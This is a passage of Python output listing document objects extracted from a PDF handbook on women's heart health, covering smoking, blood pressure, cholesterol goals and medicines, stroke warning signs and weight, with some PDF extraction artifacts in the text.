your hear t health, you’ll also need \\nto educate yourself about hear t disease and about the kinds of \\nhabits and conditions that can raise your risk. It’s your hear t, and \\nyou’re in charge. What follows is a basic guide to the most \\nimpor tant risk factors for hear t disease and how each of them \\naffects a woman’ s health. \\nSmoking \\nSmoking is “the leading cause of preventable death and disease \\nin the United States,” according to the Centers for Disease Control \\nand Prevention. Women who smoke are two to six times more \\nlikely to suffer a hear t attack than nonsmoking women, and the \\nrisk increases with the number of cigarettes smoked each day . \\nSmoking can also shor ten a healthy life, because smokers are likely \\nto suffer a hear t attack or other major hear t problem at least 10 \\nyears sooner than nonsmokers. Smoking also raises the risk of stroke. \\nBut hear t disease and stroke are not the only health risks for \\nwomen who smoke. Smoking greatly increases the chances that \\na woman will develop lung cancer .  In fact, the lung cancer death \\nrate for women is now higher than the death rate for breast \\ncancer .  Cigarette smoking also causes many other types of \\ncancer , including cancers of the mouth, urinar y tract, kidney , and \\ncervix.  Smoking also causes most cases of chronic obstructive \\nlung disease, which includes bronchitis and emphysema. \\nIf you smoke indoors, the “secondhand smoke” from your \\ncigarettes can cause hear t disease, lung cancer , and other serious \\nhealth problems in the nonsmokers around you. According to a \\nrecent repor t from the U.S. Surgeon General, exposure to smoke \\nat home or work increases a nonsmoker’ s risk of developing hear t \\n— 21 — '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 22}, page_content='MAJOR RISK FACTORS FOR /h1ear/t1 DISEASEAs important as it is to work closely with your\\ndoctor, it is only the first step.  To make a lasting\\ndifference in your heart health, you’ll also need\\nto educate yourself about heart disease and about the kinds of\\nhabits and conditions that can raise your risk.  It’s your heart, andyou’re in charge.  What follows is a basic guide to the mostimportant risk factors for heart disease and how each of themaffects a woman’s health.\\nSmoking\\nSmoking is “the leading cause of preventable death and diseasein the United States,” according to the Centers for Disease Control\\nand Prevention.  Women who smoke are two to six times morelikely to suffer a heart attack than nonsmoking women, and therisk increases with the number of cigarettes smoked each day.Smoking can also shorten a healthy life, because smokers are likelyto suffer a heart attack or other major heart problem at least 10years sooner than nonsmokers.  Smoking also raises the risk of stroke.\\nBut heart disease and stroke are not the only health risks for\\nwomen who smoke.  Smoking greatly increases the chances thata woman will develop lung cancer.  In fact, the lung cancer deathrate for women is now higher than the death rate for breastcancer.  Cigarette smoking also causes many other types ofcancer, including cancers of the mouth, urinary tract, kidney, andcervix.  Smoking also causes most cases of chronic obstructivelung disease, which includes bronchitis and emphysema.\\nIf you smoke indoors, the “secondhand smoke” from your\\ncigarettes can cause heart disease, lung cancer, and other serioushealth problems in the nonsmokers around you.  According to arecent report from the U.S. Surgeon General, exposure to smokeat home or work increases a nonsmoker’s risk of developing heart\\n— 21 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 23}, page_content='disease by 25 to 30 percent.  Secondhand smoke is especially\\nharmful to infants and young children, causing breathingproblems, ear infections, asthma attacks, and sudden infant\\ndeath syndrome (SIDS).\\nCurrently, about 20 percent of American women are smokers.  \\nIn addition, 26 percent of high school seniors smoke at least one cigarette per month.  In young people, smoking can interferewith lung growth and causes more frequent and severe respiratoryillnesses, in addition to increasing heart disease and cancerrisks.  The younger people start smoking, the more likely they are to become strongly addicted to nicotine.\\nThere is simply no safe way to smoke.  Low-tar and low-nicotine\\ncigarettes do not lessen the risks of heart disease or othersmoking-related diseases.  The only safe and healthful course isnot to smoke at all.  (For tips on how to quit, see “You \\nCanStop\\nSmoking” on page 99.)\\nHigh Blood Pressure \\nHigh blood pressure, also known as hypertension, is anothermajor risk factor for heart disease, as well as for kidney diseaseand congestive heart failure.  High blood pressure is also themost important risk factor for stroke.  Even slightly high levelsincrease your risk for these conditions.\\nNew research shows that at least 65 million adults in the United\\nStates have high blood pressure—a 30-percent increase over thelast several years.  Equally worrisome, blood pressure levelshave increased substantially for American children and teens,raising their risk of developing hypertension in adulthood.\\nMajor contributors to high blood pressure are a family history of\\nthe disease, overweight, and eating a diet high in salt andsodium.  Older individuals are at higher risk than youngerpeople.  Among older individuals, women are more likely than\\n— 22 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 24}, page_content='men to develop high blood pressure.  African American women\\nare more likely to develop high blood pressure, and at earlierages, than White women.  But nearly all of us are at risk,\\nespecially as we grow older.  Middle-aged Americans who don’t\\ncurrently have high blood pressure have a 90-percent chance ofeventually developing the disease.\\nHigh blood pressure is often called the “silent killer,” because it\\nusually doesn’t cause symptoms.  As a result, many people paylittle attention to their blood pressure until they become seriously ill.According to a national survey, two-thirds of people with highblood pressure do not have it under control.  The good news is\\nthat you can take action to control or prevent high blood pressure,and thereby avoid many life-threatening disorders.  Another newblood pressure category, called prehypertension, has been createdto alert people to their increased risk of developing high bloodpressure so that they can take steps to prevent the disease.\\nWhat Is Blood Pressure? \\nBlood pressure is the amount of force exerted by the blood\\nagainst the walls of the arteries.  Everyone has to have someblood pressure so that blood can get to all of the body’s organs.\\nUsually, blood pressure is expressed as two numbers, such as\\n120/80, and is measured in millimeters of mercury (mmHg).\\nThe first number is the systolic blood pressure, the amount offorce used when the heart beats.  The second number, ordiastolic blood pressure, is the pressure that exists in the arteriesbetween heartbeats.\\nBecause blood pressure changes often, your health care provider\\nshould check it on several different days before deciding whetheryour blood pressure is too high.  Blood pressure is considered“high” when it stays above prehypertensive levels over a periodof time.  (See next page.)\\n— 23 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 25}, page_content='Understanding Risk\\nBut numbers don’t tell the whole story.  For example, if you have \\nprehypertension, you are still at increased risk for a heart attack,\\nstroke, or heart failure.  Also, if your systolic blood pressure (first\\nnumber) is 140 mmHg or higher, you are more likely to develop\\ncardiovascular and kidney diseases even if your diastolic blood\\npressure (second number) is not too high.  Starting around age\\n55, women are more likely to develop high systolic blood\\npressure.  High systolic blood pressure ishigh blood pressure.  \\nIf you have this condition, you will need to take steps to control it.\\nHigh blood pressure can be controlled in two ways:  by changing\\nyour lifestyle and by taking medication.\\nBLOOD PRESSURE:  HOW high IS HIGH? \\nYour blood pressure is determined by the higher number of either\\nyour systolic or your diastolic measurement.  For example, if your\\nsystolic number is 115 mmHg but your diastolic number is 85 mmHg,your category is prehypertension.\\nSystolic Diastolic\\nNormal Less than 120 mmHg Less than 80 mmHg\\nPrehyper tension 120–139 mmHg 80–89 mmHg\\nHyper tension 140 mmHg or higher 90 mmHg or higher\\n— 24 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 26}, page_content='Changing Your Lifestyle \\nIf your blood pressure is not too high, you may be able to control \\nit entirely by losing weight if you are overweight, getting regularphysical activity, cutting down on alcohol, and changing your\\neating habits.  A special eating plan called “DASH” can help you\\nlower your blood pressure.  DASH stands for “Dietary Approachesto Stop Hypertension.”\\nThe DASH eating plan emphasizes fruits, vegetables, fat-free or \\nlow-fat milk and milk products, whole-grain products, fish, poultry,beans, seeds, and nuts.  The DASH eating plan also contains lesssalt/sodium, sweets, added sugars, sugar containing beverages,fats, and red meats than the typical American diet.  This heart\\nhealthy way of eating is lower in saturated fat, and cholesterol, and is rich in nutrients that are associated with lowering bloodpressure—mainly potassium, magnesium, calcium, protein, and fiber.  \\nIf you follow the DASH eating plan and also consume less sodium,\\nyou are likely to reduce your blood pressure even more.  Sodium is asubstance that affects blood pressure and is the main ingredient in salt.  \\nBecause fruits and vegetables are naturally lower in sodium than\\nmany other foods, DASH makes it easier to eat less sodium.  Try itat the 2,300 milligram level (about 1 teaspoon of table salt).  Then,talk to your doctor about gradually lowering it to 1,500 milligramsa day.  Choose and prepare foods with less salt and don’t bringthe salt shaker to the table.  And remember, salt/sodium is found inmany processed foods, such as soups, convenience meals, somebreads and cereals, and salted snacks.\\nFor more on the DASH eating plan and how to make other\\nchanges that can lower and prevent high blood pressure, see“Taking Control” on page 60 of this handbook.  \\n— 25 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 27}, page_content='PREVENTING CONGESTIVE HEART FAILURE\\nHigh blood pressure is the #1 risk factor for congestive heart\\nfailure.  Heart failure is a life-threatening condition in which the\\nheart cannot pump enough blood to supply the body’s needs.Congestive heart failure occurs when excess fluid starts to leak intothe lungs, causing tiredness, weakness, and breathing difficulties.\\nTo prevent congestive heart failure, and stroke as well, you must\\ncontrol your high blood pressure to below 140/90 mmHg.  If yourblood pressure is higher than that, talk with your doctor aboutstarting or adjusting medication, as well as making lifestyle changes.\\nTo avoid congestive heart failure, controlling your\\nweight is also very important.  Being even\\nmoderately overweight increases your risk of\\ndeveloping heart failure.\\n— 26 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 28}, page_content='ROSARIO\\n“I have to lose weight and reduce my cholesterol.\\nThis is just the beginning of a long battle, and Iknow it won’t be easy, but I know I have to do it.” \\nTaking Medication \\nIf your blood pressure remains high even after you make lifestyle\\nchanges, your doctor will probably prescribe medicine.  Lifestylechanges will help the medicine work more effectively.  In fact, if\\nyou are successful with the changes you make in your daily\\nhabits, then you may be able to gradually reduce how muchmedication you take.\\nTaking medicine to lower blood pressure can reduce your risk of\\nstroke, heart attack, congestive heart failure, and kidney disease.If you take a drug and notice any uncomfortable side effects, askyour doctor about changing the dosage or switching to anothertype of medicine.\\nA recent study found diuretics (water pills) work better than\\nnewer drugs to treat hypertension and to prevent some forms of heart disease.  If you’re starting treatment for high bloodpressure, try a diuretic first.  If you need more than one drug,ask your doctor about making one a diuretic.  And, if you’realready taking medicine for high blood pressure, ask aboutswitching to or adding a diuretic.  Diuretics work for mostpeople, but if you need a different drug, others are veryeffective.  To make the best choice, talk with your doctor.\\nRemember, it is important to take blood pressure medication\\nexactly as your doctor has prescribed it.  Before you leave yourdoctor’s office, be sure you understand the amount of medicineyou are supposed to take each day and the specific times of dayyou should take it.\\n— 27 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 29}, page_content='STROKE: know THE WARNING SIGNS\\nStroke is a medical emergency.  If you or someone you know has\\na stroke, it is important to recognize the symptoms so you can\\nget to a hospital quickly.  Getting treatment within 60 minutescan prevent disability.  The chief warning signs of a stroke are:\\n■Sudden numbness or weakness of the face, arm, or leg\\n(especially on one side of the body).\\n■Sudden confusion, trouble speaking, or understanding speech.\\n■Sudden trouble seeing in one or both eyes.\\n■Sudden trouble walking, dizziness, or loss of balance or coordination.\\n■Sudden severe headache with no known cause.\\nIf you think someone might be having a stroke, dial9–1–1 immediately.  Also, be sure that familymembers and others close to you know the\\nwarning signs of a stroke.  Give them a copy of\\nthis list.  Ask them to call 9–1–1 rightaway if you or someone elseshows any signs of a stroke.\\n— 28 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 30}, page_content='High Blood Cholesterol \\nHigh blood cholesterol is another major risk factor for heartdisease that you can do something about.  The higher your\\nblood cholesterol level, the greater your risk for developing heart\\ndisease or having a heart attack.  To prevent these disorders, allwomen should make a serious effort to keep their cholesterol athealthy levels.\\nIf you already have heart disease, it is particularly important to\\nlower an elevated blood cholesterol level to reduce your high riskfor a heart attack.  Women with diabetes also are at especiallyhigh risk for a heart attack.  If you have diabetes, you will need\\nto take steps to keep both your cholesterol and your diabetesunder control.\\nAlthough young women tend to have lower cholesterol levels\\nthan young men, between the ages of 45 and 55, women’slevels begin to rise higher than men’s.  After age 55, this“cholesterol gap” between women and men becomes still wider.Although women’s overall risk of heart disease at older agescontinues to be somewhat lower than that of men, the higher awoman’s blood cholesterol level, the greater her chances ofdeveloping heart disease.\\nCholesterol and Your Heart \\nThe body needs cholesterol to function normally.  However, your\\nbody makes all the cholesterol it needs.  Over a period of years,extra cholesterol and fat circulating in the blood build up in the\\nwalls of the arteries that supply blood to the heart.  This buildup,\\ncalled plaque, makes the arteries narrower and narrower.  As aresult, less blood gets to the heart.  Blood carries oxygen to theheart.  If not enough oxygen-rich blood can reach your heart,you may suffer chest pain.  If the blood supply to a portion of theheart is completely cut off, the result is a heart attack.\\n— 29 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 31}, page_content='Cholesterol travels in the blood in packages called lipoproteins.\\nLDL carries most of the cholesterol in the blood.  Cholesterolpackaged in LDL is often called “bad” cholesterol, because too\\nmuch LDL in the blood can lead to cholesterol buildup and\\nblockage in the arteries.\\nAnother type of cholesterol is HDL, known as “good” cholesterol.\\nThat’s because HDL helps remove cholesterol from the body,preventing it from building up in the arteries.\\nGetting Tested\\nHigh blood cholesterol itself does not cause symptoms, so if your\\ncholesterol level is too high, you may not be aware of it.  That’swhy it’s important to get your cholesterol levels checked\\nregularly.  Starting at age 20, all women should have their\\ncholesterol levels checked by means of a blood test called a“fasting lipoprotein profile.”  Be sure to ask for the test results, soyou will know whether you need to lower your cholesterol.  Askyour doctor how soon you should be retested.\\nTotal cholesterol is a measure of the cholesterol in all of your\\nlipoproteins, including the “bad” cholesterol in LDL and the “good”cholesterol in HDL.  An LDL level below 100 mg/dL* is considered\\n“optimal,” or ideal.  However, not every woman needs to aim for solow a level.  As you can see on the next page, there are four othercategories of LDL level.  The higher your LDL number, the higher yourrisk of heart disease.  Knowing your LDL number is especially importantbecause it will determine the kind of treatment you may need.\\nYour HDL number tells a different story.  The lower your HDL\\nlevel, the higher your heart disease risk.\\nYour lipoprotein profile test will also measure levels of triglycerides,\\nanother fatty substance in the blood.  (See “What AreTriglycerides?” on page 33.)\\n* Cholesterol levels are measured in milligrams (mg) of cholesterol per deciliter\\n(dL) of blood.\\n— 30 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 32}, page_content='What’s Your Number? \\nBlood Cholesterol Levels and Heart Disease Risk\\nTotal Cholesterol Level  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ Category\\nLess than 200 mg/dL  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ Desirable\\n200–239 mg/dL  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ Borderline high\\n240 mg/dL and above  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ High\\nLDL Cholesterol Level  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ Category\\nLess than 100 mg/dL  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ Optimal (ideal)\\n100–129 mg/dL  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ Near optimal/above optimal\\n130–159 mg/dL  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ Borderline high\\n160–189 mg/dL  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ High\\n190 mg/dL and above  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ Very high\\nHDL Cholesterol Level\\nAn HDL cholesterol level of less than \\n40 mg/dL is a major risk factor for\\nheart disease.  An HDL level of \\n60 mg/dL or higher is somewhat\\nprotective.\\n— 31 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 33}, page_content='Heart Disease Risk and Your LDL Goal \\nIn general, the higher your LDL level and the more other risk factors\\nyou have, the greater your chances of developing heart disease orhaving a heart attack.  The higher your risk, the lower your LDL\\ngoal level will be.  Here is how to determine your LDL goal:\\nStep 1: Count your risk factors.  Below are risk factors for heart\\ndisease that will affect your LDL goal.  Check to see how many of\\nthe following risk factors* you have:\\n■Cigarette smoking\\n■High blood pressure (140/90 mmHg or higher, or if you are\\non blood pressure medication)\\n■Low HDL cholesterol (less than 40 mg/dL)†\\n■Family history of early heart disease (your father or brotherbefore age 55, or your mother or sister before age 65)\\n■Age (55 or older)\\nStep 2: Find Out Your Risk Score.  If you have two or\\nmore risk factors in Step 1, you will need to figure out your “riskscore.”  This score will show your chances of having a heart\\nattack in the next 10 years.  To find out your risk score, see\\n“How To Estimate Your Risk” on page 118.\\n* Diabetes is not on the list because a person with diabetes is already considered to\\nbe at high risk for a heart attack—at the same level of risk as someone who has\\nheart disease.  Also, even though overweight and physical inactivity are not on\\nthis list of risk factors, they are conditions that raise your risk for heart disease and\\nneed to be corrected.\\n†If your HDL cholesterol is 60 mg/dL or higher, subtract 1 from your total.\\n— 32 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 34}, page_content='Step 3: Find Out Your Risk Category.  Use your number \\nof risk factors, risk score, and medical history to find out yourcategory of risk for heart disease or heart attack.  Use the \\ntable below:\\nIf You Have Your Category Is  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\\n _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\\n _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\\n _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\\n _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _Heart disease, diabetes, or a \\nrisk score of more than 20 percent High Risk\\n2 or more risk factors and a risk score of 10 to 20 percent\\nNext Highest Risk\\n2 or more risk factors and a risk score of less than 10 percent\\nModerate Risk\\n0 to 1 risk factor Low-to-Moderate Risk\\nwhat ARE TRIGLYCERIDES?\\nTriglycerides are another type of fat found in the blood and in food.Triglycerides are produced in the liver.  When you drink alcohol or\\ntake in more calories than your body needs, your liver producesmore triglycerides.  Triglyceride levels that are borderline high(150–199 mg/dL) or high (200–499 mg/dL) are signals of anincreased risk for heart disease.  To reduce blood triglyceride levels,it is important to control your weight, get more physical activity, quitsmoking, and avoid alcohol.  You should also follow an eating \\nplan that is not too high in carbohydrates (less than 60 percent ofcalories) and is low in saturated fat, \\ntransfat, and cholesterol.\\nSometimes, medication is also needed.\\n— 33 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 35}, page_content='ERIN\\n“No one, least of all me, was ever really concerned\\nabout my heart health because I was a young, thinfemale, who did not smoke.  After my heart attack, \\nI had to face my own mortality.  It was a life-altering\\nevent for my entire family.”\\nA Special Type of Risk\\nSome women have a group of risk factors known as “metabolic\\nsyndrome,” which is usually caused by overweight or obesityand by not getting enough physical activity.  This cluster of risk\\nfactors increases your risk of heart disease and diabetes,\\nregardless of your LDL cholesterol level.  Women have metabolicsyndrome if they have three or more of the following conditions:\\n■A waist measurement of 35 inches or more\\n■Triglycerides of 150 mg/dL or more\\n■An HDL level of less than 50 mg/dL\\n■Blood pressure of 130/85 mmHg or more (either number counts)\\n■Blood sugar of 100 mg/dL or more\\nIf you have metabolic syndrome, you should calculate your riskscore and risk category as indicated in Steps 2 and 3 on theprevious page.  \\nYou should make a particularly strong effort to reach and maintain\\nyour LDL goal.  You should emphasize weight control and physicalactivity to correct the risk factors of the metabolic syndrome.\\n— 34 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 36}, page_content='Your LDL Goal \\nThe main goal of cholesterol-lowering treatment is to lower your\\nLDL level enough to reduce your risk of heart disease or heartattack.  The higher your risk category, the lower your LDL goal\\nwill be.  To find your personal LDL goal, see the table below:\\nIf You Are in This Risk Category \\n _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _ Your LDL Goal Is\\nHigh Risk  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _ _   _  _  _  _  _  _  _  _  _  _  _  _ Less than 100 mg/dL\\nNext Highest Risk or Moderate Risk  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _ Less than 130 mg/dL\\nLow-to-Moderate Risk  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _ Less than 160 mg/dL\\nRecent studies have added to the evidence suggesting that for\\npeople with heart disease, lower LDL cholesterol is better.  Becausethese studies show a direct relationship between lower LDLcholesterol and reduced risk for heart attack, it is now reasonablefor doctors to set the LDL treatment goal for heart disease patients atless than 70 mg/dL—well below the recommended level of lessthan 100 mg/dL.  Doctors may also use more intensive cholesterol-lowering treatment to help patients reach this goal.\\nIf you have heart disease, work with your doctor to lower your LDL\\ncholesterol as much as possible.  But even if you can’t lower yourLDL cholesterol to less than 70 mg/dL because of a high startinglevel, lowering your LDL cholesterol to less than 100 mg/dL will stillgreatly reduce your risk.  \\n— 35 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 37}, page_content='How To Lower Your LDL \\nThere are two main ways to lower your LDL cholesterol—through\\nlifestyle changes alone, or though medication combined withlifestyle changes.  Depending on your risk category, the use of\\nthese treatments will differ.\\nBecause of the recent studies that showed the benefit of more\\nintensive cholesterol lowering, physicians have the option to startcholesterol medication—in addition to lifestyle therapy—at lowerLDL levels than previously recommended for high-risk patients.For information on the updated treatment options and the besttreatment plan for your risk category, see the fact sheet, “HighBlood Cholesterol:  What You Need To Know,” available on the\\nNHLBI Web site or from the NHLBI Health Information Center.(See “To Learn More” on page 119.)\\nLifestyle Changes.  One important treatment approach is\\ncalled the TLC Program.  TLC stands for “Therapeutic Lifestyle\\nChanges,” a three-part treatment that uses diet, physical activity,and weight management.  Every woman who needs to lower herLDL cholesterol should use the TLC Program.  (For more on theTLC approach, see page 70.)  Maintaining a healthy weight andgetting regular physical activity are especially important forwomen who have metabolic syndrome.  \\nMedication. If your LDL level stays too high even after making\\nlifestyle changes, you may need to take medicine.  If you need\\nmedication, be sure to use it along with the TLC approach.  This willkeep the dose of medicine as low as possible and lower your riskin other ways as well.  You will also need to control all of yourother heart disease risk factors, including high blood pressure,diabetes, and smoking.\\n— 36 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 38}, page_content='CHOLESTEROL-LOWERING MEDICINES\\nAs part of your cholesterol-lowering treatment plan, your doctor\\nmay recommend medication.  The most commonly used medicinesare listed below.\\nStatins.  These are the most commonly prescribed drugs for people\\nwho need a cholesterol-lowering medicine.  They lower LDL levelsmore than other types of drugs—about 20 to 55 percent.  They alsomoderately lower triglycerides and raise HDL.  Side effects areusually mild, although liver and muscle problems may occur rarely.If you experience muscle aches or weakness, you should contactyour doctor promptly.\\nEzetimibe.  This is the first in a new class of cholesterol-\\nlowering drugs that interferes with the absorption of cholesterolin the intestine.  Ezetimbe lowers LDL by about 18 to 25 percent.  It can be used alone or in combination with a statin to get morelowering of LDL.  Side effects may include back and joint pain.\\nBile acid resins.  These medications lower LDL cholesterol by\\nabout 15 to 30 percent.  Bile acid resins are often prescribedalong with a statin to further decrease LDL cholesterol levels.  Side effects may include constipation, bloating, nausea, and gas.However, long-term use of these medicines is considered safe.  \\nNiacin.  Niacin, or nicotinic acid, lowers total cholesterol, LDL\\ncholesterol, and triglyceride levels, while also raising HDL cholesterol.It reduces LDL levels by about 5 to 15 percent, and up to 25 percentin some patients.  Although niacin is available without a prescription,it is important to use it only under a doctor’s care because of possiblyserious side effects.  In some people, it may worsen peptic ulcers orcause liver problems, gout, or high blood sugar.  \\nFibrates.  These drugs can reduce triglyceride levels by 20 to 50\\npercent, while increasing HDL cholesterol by 10 to 15 percent.Fibrates are not very effective for lowering LDL cholesterol.  Thedrugs can increase the chances of developing gallstones andheighten the effects of blood-thinning drugs.\\n— 37 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 39}, page_content='Overweight and Obesity\\nA healthy weight is important for a long, vigorous life.  Yetoverweight and obesity (extreme overweight) have reached\\nepidemic levels in the United States.  About 62 percent of all\\nAmerican women age 20 and older are overweight—about 33 percent of them are obese (extremely overweight).  The moreoverweight a woman is, the higher her risk for heart disease.Overweight also increases the risks for stroke, congestive heartfailure, gallbladder disease, arthritis, and breathing problems, as well as for breast, colon, and other cancers.\\nOverweight in children is also swiftly increasing.  Among young\\npeople 6 to 19 years old, more than 16 percent are overweight,compared to just 4 percent a few decades ago.  This is adisturbing trend because overweight teens have a greatlyincreased risk of dying from heart disease in adulthood.  Even our youngest citizens are at risk.  About 10 percent ofpreschoolers weigh more than is healthy for them.\\nOur national waistline is expanding for two simple reasons—we\\nare eating more and moving less.  Today, Americans consumeabout 200 to 300 more calories per day than they did in the1970s.  Moreover, as we spend more time in front of computers,video games, TV, and other electronic pastimes, we have fewerhours available for physical activity.  There is growing evidenceof a link between “couch potato” behavior and an increased riskof obesity and many chronic diseases.\\nIt is hard to overstate the dangers of an unhealthy weight.  If you\\nare overweight, you are more likely to develop heart diseaseeven if you have no other risk factors.  Overweight and obesityalso increase the risks for diabetes, high blood pressure, highblood cholesterol, stroke, congestive heart failure, gallbladderdisease, arthritis, breathing problems, and gout, as well as forcancers of the breast and colon.  \\n— 38 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 40}, page_content='Each year, an estimated 300,000 U.S. adults die of diseases\\nrelated to obesity.  The bottom line is that maintaining a healthyweight is an extremely important part of heart disease\\nprevention.  It can help to protect your health—and may even\\nsave your life.\\nShould You Choose To Lose? \\nDo you need to lose weight to reduce your risk of heart disease?\\nYou can find out by taking three simple steps.\\nStep 1:  Get your number. Take a look at the box on page\\n41.  You’ll notice that your weight in relation to your height gives\\nyou a number called a “body mass index” (BMI).  A BMI of 18.5to 24.9 indicates a normal weight.  A person with a BMI from25 to 29.9 is overweight, while someone with a BMI of 30 orhigher is obese.  Those in the “overweight” or “obese” categorieshave a higher risk of heart disease—and the higher the BMI, thegreater the risk.\\nStep 2:  Take out a tape measure. For women, a waist\\nmeasurement of more than 35 inches increases the risk of heart\\ndisease as well as the risks of high blood pressure, diabetes,and other serious health conditions.  To measure your waistcorrectly, stand and place a tape measure around your middle,just above your hip bones.  Measure your waist just after youbreathe out.\\nStep 3:  Review your risk. The final step in determining\\nyour need to lose weight is to find out your other risk factors for\\nheart disease.  It is important to know whether you have any ofthe following:  high blood pressure, high LDL cholesterol, lowHDL cholesterol, high triglycerides, high blood glucose (bloodsugar), physical inactivity, smoking, or a family history of earlyheart disease.  Being age 55 or older or having gone throughmenopause also increases risk.  If you have a condition known\\n— 39 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 41}, page_content='as metabolic syndrome (see page 34), your risk of heart disease\\nis particularly high.  If you aren’t sure whether you have some ofthese risk factors, ask your doctor.\\nOnce you have taken these three steps, you can use the\\ninformation to decide whether you need to take off pounds.\\nAlthough you should talk with your doctor about whether youshould lose weight, keep these guidelines in mind:\\n■If you are overweight AND have two or more other risk\\nfactors, or if you are obese, you should lose weight.\\n■If you are overweight, have a waist measurement of more than 35 inches, AND have two or more other risk factors, you should lose weight.\\n■If you are overweight, but do not have a high waistmeasurement and have fewer than two other risk factors, you should avoid further weight gain.\\n— 40 —'),\n",
